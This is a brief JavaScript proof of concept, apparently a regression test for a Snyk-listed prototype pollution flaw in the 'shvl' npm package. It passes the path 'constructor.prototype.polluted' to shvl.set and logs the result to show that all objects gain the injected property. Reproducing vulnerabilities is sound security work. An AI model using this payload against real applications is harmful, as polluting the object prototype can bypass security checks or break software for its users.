// //https://snyk.io/vuln/SNYK-JS-SHVL-1085284

// test("prototype pollution in shvl", () => {
  var shvl = require("shvl");
  obj = {};

console.log({}.polluted);

  shvl.set(obj, "constructor.prototype.polluted", "yes");
console.log({}.polluted);
// });
